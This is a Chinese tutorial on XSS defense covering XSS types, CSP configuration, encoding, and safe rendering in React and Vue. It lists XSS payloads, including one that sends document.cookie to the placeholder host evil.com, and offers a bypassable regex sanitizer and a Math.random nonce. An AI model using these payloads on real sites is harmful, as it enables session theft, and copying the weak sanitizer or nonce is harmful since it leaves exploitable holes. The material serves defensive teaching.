# XSS防御 - 完整教程

## 课程简介
深入理解XSS（跨站脚本攻击）的原理、类型和防御策略，掌握CSP配置和安全编码实践。

## 学习目标
- 理解XSS攻击原理和类型
- 掌握XSS防御策略
- 学会配置CSP（内容安全策略）
- 实践安全编码规范
- 了解XSS检测和修复方法

---

## 第一部分：XSS基础

### 1.1 XSS概述

#### XSS攻击原理
```javascript
/**
 * XSS攻击示例（仅用于教学）
 * @author erik.zhou
 */

const xssExamples = {
    // 存储型XSS
    stored: {
        name: '存储型XSS（Stored XSS）',
        description: '恶意脚本存储在服务器数据库中',
        scenario: '用户评论、个人资料、论坛帖子',
        example: {
            input: '<script>alert("XSS")</script>',
            storage: '存储到数据库',
            output: '其他用户访问时执行脚本'
        },
        danger: '最危险，影响所有访问用户'
    },
    
    // 反射型XSS
    reflected: {
        name: '反射型XSS（Reflected XSS）',
        description: '恶意脚本通过URL参数传递',
        scenario: '搜索结果、错误消息、URL参数',
        example: {
            url: 'https://example.com/search?q=<script>alert("XSS")</script>',
            process: '服务器直接返回参数内容',
            output: '脚本在页面中执行'
        },
        danger: '需要诱导用户点击恶意链接'
    },
    
    // DOM型XSS
    dom: {
        name: 'DOM型XSS（DOM-based XSS）',
        description: '通过修改DOM环境执行恶意脚本',
        scenario: '客户端JavaScript处理用户输入',
        example: {
            code: 'document.write(location.hash)',
            url: 'https://example.com#<script>alert("XSS")</script>',
            process: '客户端JavaScript直接使用URL片段'
        },
        danger: '完全在客户端执行，难以检测'
    }
};

// 打印XSS类型
function printXSSTypes() {
    console.log('=== XSS攻击类型 ===\n');
    
    for (const [key, xss] of Object.entries(xssExamples)) {
        console.log(`${xss.name}`);
        console.log(`  描述: ${xss.description}`);
        console.log(`  场景: ${xss.scenario}`);
        console.log(`  危险性: ${xss.danger}\n`);
    }
}

printXSSTypes();
```

#### XSS攻击向量
```javascript
/**
 * 常见XSS攻击向量
 * @author erik.zhou
 */

const xssVectors = {
    // 脚本标签
    scriptTag: [
        '<script>alert("XSS")</script>',
        '<script src="http://evil.com/xss.js"></script>',
        '<script>document.location="http://evil.com?cookie="+document.cookie</script>'
    ],
    
    // 事件处理器
    eventHandlers: [
        '<img src=x onerror="alert(\'XSS\')">',
        '<body onload="alert(\'XSS\')">',
        '<input onfocus="alert(\'XSS\')" autofocus>',
        '<svg onload="alert(\'XSS\')">',
        '<iframe onload="alert(\'XSS\')"></iframe>'
    ],
    
    // JavaScript伪协议
    javascript: [
        '<a href="javascript:alert(\'XSS\')">Click</a>',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>'
    ],
    
    // HTML属性
    attributes: [
        '<div style="background:url(javascript:alert(\'XSS\'))">',
        '<input value="x" onclick="alert(\'XSS\')">',
        '<a href="x" onclick="alert(\'XSS\')">Click</a>'
    ],
    
    // 编码绕过
    encoding: [
        '<script>alert(String.fromCharCode(88,83,83))</script>',
        '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">',
        '<script>eval(atob("YWxlcnQoJ1hTUycp"))</script>' // Base64
    ]
};

// 打印攻击向量
function printXSSVectors() {
    console.log('=== XSS攻击向量 ===\n');
    
    for (const [category, vectors] of Object.entries(xssVectors)) {
        console.log(`${category}:`);
        vectors.forEach((vector, index) => {
            console.log(`  ${index + 1}. ${vector}`);
        });
        console.log('');
    }
}

printXSSVectors();
```

## 第二部分：XSS防御

### 2.1 输入验证

#### 输入过滤
```javascript
/**
 * 输入验证和过滤
 * @author erik.zhou
 */

class InputValidator {
    // 验证用户名
    static validateUsername(username) {
        // 只允许字母、数字、下划线
        const pattern = /^[a-zA-Z0-9_]{3,20}$/;
        
        if (!pattern.test(username)) {
            throw new Error('用户名格式无效');
        }
        
        return username;
    }
    
    // 验证邮箱
    static validateEmail(email) {
        const pattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        
        if (!pattern.test(email)) {
            throw new Error('邮箱格式无效');
        }
        
        return email;
    }
    
    // 验证URL
    static validateURL(url) {
        try {
            const urlObj = new URL(url);
            
            // 只允许http和https协议
            if (!['http:', 'https:'].includes(urlObj.protocol)) {
                throw new Error('URL协议不允许');
            }
            
            return url;
        } catch (error) {
            throw new Error('URL格式无效');
        }
    }
    
    // 过滤HTML标签
    static stripHTMLTags(input) {
        return input.replace(/<[^>]*>/g, '');
    }
    
    // 过滤危险字符
    static sanitizeInput(input) {
        // 移除脚本标签
        let sanitized = input.replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '');
        
        // 移除事件处理器
        sanitized = sanitized.replace(/on\w+\s*=\s*["'][^"']*["']/gi, '');
        
        // 移除javascript:伪协议
        sanitized = sanitized.replace(/javascript:/gi, '');
        
        return sanitized;
    }
}

// 使用示例
try {
    const username = InputValidator.validateUsername('user_123');
    console.log('有效用户名:', username);
    
    const email = InputValidator.validateEmail('user@example.com');
    console.log('有效邮箱:', email);
    
    const url = InputValidator.validateURL('https://example.com');
    console.log('有效URL:', url);
    
    const dangerous = '<script>alert("XSS")</script>Hello';
    const safe = InputValidator.sanitizeInput(dangerous);
    console.log('过滤后:', safe);
    
} catch (error) {
    console.error('验证失败:', error.message);
}
```

### 2.2 输出编码

#### HTML编码
```javascript
/**
 * HTML编码防御XSS
 * @author erik.zhou
 */

class HTMLEncoder {
    // HTML实体编码
    static encodeHTML(str) {
        const entityMap = {
            '&': '&amp;',
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#x27;',
            '/': '&#x2F;'
        };
        
        return String(str).replace(/[&<>"'\/]/g, (char) => entityMap[char]);
    }
    
    // JavaScript编码
    static encodeJavaScript(str) {
        return String(str)
            .replace(/\\/g, '\\\\')
            .replace(/'/g, "\\'")
            .replace(/"/g, '\\"')
            .replace(/\n/g, '\\n')
            .replace(/\r/g, '\\r')
            .replace(/\t/g, '\\t');
    }
    
    // URL编码
    static encodeURL(str) {
        return encodeURIComponent(str);
    }
    
    // CSS编码
    static encodeCSS(str) {
        return String(str).replace(/[^a-zA-Z0-9]/g, (char) => {
            return '\\' + char.charCodeAt(0).toString(16) + ' ';
        });
    }
    
    // 安全地插入HTML
    static safeHTML(template, data) {
        return template.replace(/\{\{(\w+)\}\}/g, (match, key) => {
            return this.encodeHTML(data[key] || '');
        });
    }
}

// 使用示例
const userInput = '<script>alert("XSS")</script>';

console.log('原始输入:', userInput);
console.log('HTML编码:', HTMLEncoder.encodeHTML(userInput));
console.log('JS编码:', HTMLEncoder.encodeJavaScript(userInput));
console.log('URL编码:', HTMLEncoder.encodeURL(userInput));

// 安全模板
const template = '<div>用户名: {{username}}</div>';
const data = { username: '<script>alert("XSS")</script>' };
const safeOutput = HTMLEncoder.safeHTML(template, data);
console.log('安全输出:', safeOutput);
```

### 2.3 内容安全策略（CSP）

#### CSP配置
```javascript
/**
 * CSP（Content Security Policy）配置
 * @author erik.zhou
 */

class CSPConfig {
    // 基础CSP策略
    static basic() {
        return {
            'Content-Security-Policy': [
                "default-src 'self'",
                "script-src 'self'",
                "style-src 'self'",
                "img-src 'self' data: https:",
                "font-src 'self'",
                "connect-src 'self'",
                "frame-ancestors 'none'",
                "base-uri 'self'",
                "form-action 'self'"
            ].join('; ')
        };
    }
    
    // 严格CSP策略
    static strict() {
        return {
            'Content-Security-Policy': [
                "default-src 'none'",
                "script-src 'self' 'nonce-{random}'",
                "style-src 'self' 'nonce-{random}'",
                "img-src 'self' https:",
                "font-src 'self'",
                "connect-src 'self'",
                "frame-ancestors 'none'",
                "base-uri 'none'",
                "form-action 'self'",
                "upgrade-insecure-requests"
            ].join('; ')
        };
    }
    
    // 开发环境CSP
    static development() {
        return {
            'Content-Security-Policy': [
                "default-src 'self'",
                "script-src 'self' 'unsafe-inline' 'unsafe-eval'",
                "style-src 'self' 'unsafe-inline'",
                "img-src 'self' data: https:",
                "connect-src 'self' ws: wss:"
            ].join('; ')
        };
    }
    
    // 生产环境CSP
    static production() {
        return {
            'Content-Security-Policy': [
                "default-src 'self'",
                "script-src 'self' https://cdn.example.com",
                "style-src 'self' https://cdn.example.com",
                "img-src 'self' https://cdn.example.com data:",
                "font-src 'self' https://cdn.example.com",
                "connect-src 'self' https://api.example.com",
                "frame-ancestors 'none'",
                "base-uri 'self'",
                "form-action 'self'",
                "upgrade-insecure-requests",
                "block-all-mixed-content"
            ].join('; ')
        };
    }
    
    // 生成nonce
    static generateNonce() {
        return Math.random().toString(36).substring(2, 15);
    }
    
    // 应用CSP到HTML
    static applyToHTML(html, nonce) {
        // 为script和style标签添加nonce
        html = html.replace(/<script/g, `<script nonce="${nonce}"`);
        html = html.replace(/<style/g, `<style nonce="${nonce}"`);
        
        return html;
    }
}

// 使用示例
console.log('=== CSP配置示例 ===\n');

console.log('1. 基础CSP:');
console.log(CSPConfig.basic());

console.log('\n2. 严格CSP:');
console.log(CSPConfig.strict());

console.log('\n3. 生产环境CSP:');
console.log(CSPConfig.production());

// 生成nonce
const nonce = CSPConfig.generateNonce();
console.log('\n生成的nonce:', nonce);
```

#### CSP违规报告
```javascript
/**
 * CSP违规报告处理
 * @author erik.zhou
 */

class CSPReporter {
    constructor() {
        this.violations = [];
        this.setupReporting();
    }
    
    // 设置CSP报告
    setupReporting() {
        // 监听CSP违规
        document.addEventListener('securitypolicyviolation', (event) => {
            this.handleViolation(event);
        });
    }
    
    // 处理违规
    handleViolation(event) {
        const violation = {
            blockedURI: event.blockedURI,
            violatedDirective: event.violatedDirective,
            effectiveDirective: event.effectiveDirective,
            originalPolicy: event.originalPolicy,
            sourceFile: event.sourceFile,
            lineNumber: event.lineNumber,
            columnNumber: event.columnNumber,
            timestamp: new Date().toISOString()
        };
        
        console.warn('CSP违规:', violation);
        
        // 记录违规
        this.violations.push(violation);
        
        // 发送到服务器
        this.reportToServer(violation);
    }
    
    // 发送报告到服务器
    async reportToServer(violation) {
        try {
            await fetch('/api/csp-report', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(violation)
            });
        } catch (error) {
            console.error('发送CSP报告失败:', error);
        }
    }
    
    // 获取违规统计
    getStatistics() {
        const stats = {
            total: this.violations.length,
            byDirective: {},
            bySource: {}
        };
        
        for (const violation of this.violations) {
            // 按指令统计
            const directive = violation.violatedDirective;
            stats.byDirective[directive] = (stats.byDirective[directive] || 0) + 1;
            
            // 按来源统计
            const source = violation.blockedURI;
            stats.bySource[source] = (stats.bySource[source] || 0) + 1;
        }
        
        return stats;
    }
}

// 使用示例
const reporter = new CSPReporter();

// 模拟CSP违规
setTimeout(() => {
    const stats = reporter.getStatistics();
    console.log('CSP违规统计:', stats);
}, 5000);
```

## 第三部分：框架防御

### 3.1 React防御

#### React安全实践
```javascript
/**
 * React XSS防御
 * @author erik.zhou
 */

// React自动转义
function SafeComponent({ userInput }) {
    // React会自动转义文本内容
    return (
        <div>
            <h1>{userInput}</h1>
            {/* 安全：React会转义 < > & " ' */}
        </div>
    );
}

// 危险的dangerouslySetInnerHTML
function DangerousComponent({ htmlContent }) {
    // 危险：直接插入HTML
    return (
        <div dangerouslySetInnerHTML={{ __html: htmlContent }} />
    );
}

// 安全的HTML渲染
import DOMPurify from 'dompurify';

function SafeHTMLComponent({ htmlContent }) {
    // 使用DOMPurify清理HTML
    const cleanHTML = DOMPurify.sanitize(htmlContent);
    
    return (
        <div dangerouslySetInnerHTML={{ __html: cleanHTML }} />
    );
}

// 安全的URL处理
function SafeLinkComponent({ url, children }) {
    // 验证URL协议
    const isSafeURL = (url) => {
        try {
            const urlObj = new URL(url);
            return ['http:', 'https:'].includes(urlObj.protocol);
        } catch {
            return false;
        }
    };
    
    if (!isSafeURL(url)) {
        return <span>{children}</span>;
    }
    
    return <a href={url}>{children}</a>;
}
```

### 3.2 Vue防御

#### Vue安全实践
```javascript
/**
 * Vue XSS防御
 * @author erik.zhou
 */

// Vue模板自动转义
const SafeVueComponent = {
    template: `
        <div>
            <h1>{{ userInput }}</h1>
            <!-- 安全：Vue会自动转义 -->
        </div>
    `,
    props: ['userInput']
};

// 危险的v-html
const DangerousVueComponent = {
    template: `
        <div v-html="htmlContent"></div>
        <!-- 危险：直接插入HTML -->
    `,
    props: ['htmlContent']
};

// 安全的HTML渲染
import DOMPurify from 'dompurify';

const SafeHTMLVueComponent = {
    template: `
        <div v-html="cleanHTML"></div>
    `,
    props: ['htmlContent'],
    computed: {
        cleanHTML() {
            return DOMPurify.sanitize(this.htmlContent);
        }
    }
};

// 自定义指令进行清理
const app = Vue.createApp({});

app.directive('safe-html', {
    mounted(el, binding) {
        el.innerHTML = DOMPurify.sanitize(binding.value);
    },
    updated(el, binding) {
        el.innerHTML = DOMPurify.sanitize(binding.value);
    }
});
```

## 总结

### XSS防御核心要点

1. XSS类型
   - 存储型XSS：最危险
   - 反射型XSS：需诱导点击
   - DOM型XSS：客户端执行

2. 防御策略
   - 输入验证：白名单验证
   - 输出编码：HTML/JS/URL编码
   - CSP：限制资源加载
   - HttpOnly Cookie：防止窃取

3. 编码方法
   - HTML编码：&lt; &gt; &amp;
   - JavaScript编码：\\ \' \"
   - URL编码：encodeURIComponent
   - CSS编码：十六进制转义

4. CSP配置
   - default-src：默认策略
   - script-src：脚本来源
   - style-src：样式来源
   - nonce：随机令牌

5. 框架防御
   - React：自动转义，避免dangerouslySetInnerHTML
   - Vue：自动转义，避免v-html
   - 使用DOMPurify清理HTML

### 最佳实践

1. 永远不要信任用户输入
2. 对所有输出进行编码
3. 使用CSP限制资源
4. 使用HttpOnly Cookie
5. 使用框架的安全特性
6. 定期进行安全审计
7. 使用自动化扫描工具
8. 保持依赖库更新

### 常见错误

1. 直接插入用户输入到HTML
2. 使用innerHTML而不编码
3. 在JavaScript中拼接用户输入
4. 不验证URL协议
5. 过度信任第三方库
6. 不使用CSP
7. Cookie未设置HttpOnly

### 学习资源

- [OWASP XSS防御备忘单](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [MDN CSP文档](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP)
- [DOMPurify库](https://github.com/cure53/DOMPurify)
- [CSP Evaluator](https://csp-evaluator.withgoogle.com/)

---

**@author erik.zhou**
**最后更新时间：** 2026-03-06
